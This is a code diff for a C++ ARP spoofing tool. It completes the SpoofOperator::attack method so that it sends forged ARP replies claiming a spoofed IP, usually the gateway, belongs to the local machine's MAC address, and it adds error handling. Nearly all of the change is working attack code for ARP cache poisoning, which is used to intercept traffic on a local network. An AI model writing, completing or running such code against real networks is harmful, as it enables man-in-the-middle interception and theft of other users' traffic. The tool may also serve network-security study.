@@ -13,21 +13,32 @@ SpoofOperator::SpoofOperator(ARPOperator *arp_operator, std::string gateway_ip, 
     this->ip2mac_map = ip2mac_map;
     this->arp_operator = arp_operator;
     this->gateway_ip = gateway_ip;
+    this->source_ip = arp_operator->get_local_ip();
+    this->source_mac = arp_operator->get_local_mac();
 }
 
-int SpoofOperator::attack(std::string target_ip)
+int SpoofOperator::attack(std::string target_ip, std::string spoof_ip)
 {
     // set opcode = 2
     arp_operator->set_mode(ARP_REPLY);
+
     // set pdst = target_ip
     // set hwdst = target_mac
+    // set ether frame target & source
     arp_operator->set_ether_target(ip2mac_map->find(target_ip)->second);
-    // arp_operator->set_ether_source
+    arp_operator->set_ether_source(source_mac);
+
     arp_operator->set_target(target_ip, ip2mac_map->find(target_ip)->second);
-    // set psrc = spoof_ip
-    // arp_operator->set_source(gateway_ip, 
+    arp_operator->set_source(spoof_ip, source_mac);
+
     // send packet
-    arp_operator->send();
+    arp_operator->list_frame_info();
+
+    if (arp_operator->send() < 0) {
+        std::cerr << "send operation failed" << std::endl;
+        perror("arp_operator->send() failed");
+        return 1;
+    }
     return 0;
 }
 
